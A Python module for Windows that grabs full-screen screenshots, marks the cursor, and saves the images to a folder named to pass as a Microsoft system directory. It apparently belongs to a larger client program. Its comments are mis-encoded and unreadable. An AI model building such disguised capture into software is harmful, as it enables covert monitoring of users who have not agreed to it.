import logging
import time
import os
from PIL import Image, ImageDraw, ImageGrab
import ctypes
import ctypes.wintypes

logger = logging.getLogger(__name__)

# –ö–æ–Ω—Å—Ç–∞–Ω—Ç–∞ –¥–ª—è –≤—Ä–µ–º–µ–Ω–Ω–æ–π –ø–∞–ø–∫–∏ (–¥–æ–ª–∂–Ω–∞ —Å–æ–≤–ø–∞–¥–∞—Ç—å —Å client.py)
TEMP_SYSTEM_FOLDER = os.path.join(os.getenv('APPDATA'), "Microsoft", "TempSystem")

def take_screenshot():
    try:
        # –°–æ–∑–¥–∞–Ω–∏–µ –≤—Ä–µ–º–µ–Ω–Ω–æ–π –ø–∞–ø–∫–∏, –µ—Å–ª–∏ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç
        os.makedirs(TEMP_SYSTEM_FOLDER, exist_ok=True)
        
        # –ó–∞—Ö–≤–∞—Ç —Å–∫—Ä–∏–Ω—à–æ—Ç–∞
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(TEMP_SYSTEM_FOLDER, f"screenshot_{timestamp}.png")
        screenshot = ImageGrab.grab()
        
        # –ü–æ–ª—É—á–µ–Ω–∏–µ –ø–æ–∑–∏—Ü–∏–∏ –∏ –∏–∫–æ–Ω–∫–∏ –∫—É—Ä—Å–æ—Ä–∞ —á–µ—Ä–µ–∑ WinAPI
        user32 = ctypes.WinDLL('user32')
        gdi32 = ctypes.WinDLL('gdi32')
        
        # –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Å—Ç—Ä—É–∫—Ç—É—Ä—É CURSORINFO
        class CURSORINFO(ctypes.Structure):
            _fields_ = [
                ("cbSize", ctypes.wintypes.DWORD),
                ("flags", ctypes.wintypes.DWORD),
                ("hCursor", ctypes.wintypes.HANDLE),
                ("ptScreenPos", ctypes.wintypes.POINT)
            ]
        
        # –ü–æ–ª—É—á–µ–Ω–∏–µ —Ç–µ–∫—É—â–µ–π –ø–æ–∑–∏—Ü–∏–∏ –∫—É—Ä—Å–æ—Ä–∞
        cursor_info = CURSORINFO()
        cursor_info.cbSize = ctypes.sizeof(cursor_info)
        user32.GetCursorInfo(ctypes.byref(cursor_info))
        
        if cursor_info.flags == 1:  # CURSOR_SHOWING
            # –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–∫–æ–Ω–∫–∏ –∫—É—Ä—Å–æ—Ä–∞
            class ICONINFO(ctypes.Structure):
                _fields_ = [
                    ("fIcon", ctypes.wintypes.BOOL),
                    ("xHotspot", ctypes.wintypes.DWORD),
                    ("yHotspot", ctypes.wintypes.DWORD),
                    ("hbmMask", ctypes.wintypes.HBITMAP),
                    ("hbmColor", ctypes.wintypes.HBITMAP)
                ]
            icon_info = ICONINFO()
            user32.GetIconInfo(cursor_info.hCursor, ctypes.byref(icon_info))
            
            # –°–æ–∑–¥–∞–Ω–∏–µ –æ–±—ä–µ–∫—Ç–∞ –¥–ª—è —Ä–∏—Å–æ–≤–∞–Ω–∏—è
            draw = ImageDraw.Draw(screenshot)
            
            # –ü–æ–ª—É—á–µ–Ω–∏–µ –ø–æ–∑–∏—Ü–∏–∏ –∫—É—Ä—Å–æ—Ä–∞
            x, y = cursor_info.ptScreenPos.x, cursor_info.ptScreenPos.y
            
            # –£—á–µ—Ç –≥–æ—Ä—è—á–µ–π —Ç–æ—á–∫–∏ –∫—É—Ä—Å–æ—Ä–∞
            hotspot_x, hotspot_y = icon_info.xHotspot, icon_info.yHotspot
            
            # –†–∏—Å—É–µ–º –∫—É—Ä—Å–æ—Ä –∫–∞–∫ –ø–æ–ª—É–ø—Ä–æ–∑—Ä–∞—á–Ω—ã–π –∫—Ä–∞—Å–Ω—ã–π –ø—Ä—è–º–æ—É–≥–æ–ª—å–Ω–∏–∫
            draw.rectangle(
                (x - hotspot_x, y - hotspot_y, x - hotspot_x + 16, y - hotspot_y + 16),
                fill=(255, 0, 0, 128)  # –ü–æ–ª—É–ø—Ä–æ–∑—Ä–∞—á–Ω—ã–π –∫—Ä–∞—Å–Ω—ã–π –ø—Ä—è–º–æ—É–≥–æ–ª—å–Ω–∏–∫
            )
            
            # –û—Å–≤–æ–±–æ–∂–¥–µ–Ω–∏–µ —Ä–µ—Å—É—Ä—Å–æ–≤
            if icon_info.hbmMask:
                gdi32.DeleteObject(icon_info.hbmMask)
            if icon_info.hbmColor:
                gdi32.DeleteObject(icon_info.hbmColor)
        
        # –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞
        screenshot.save(filename)
        logger.info(f"üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç —Å–æ—Ö—Ä–∞–Ω–µ–Ω: {filename}")
        return filename
    except Exception as e:
        logger.error(f"‚ùå –û—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è —Å–∫—Ä–∏–Ω—à–æ—Ç–∞: {e}")
        return None
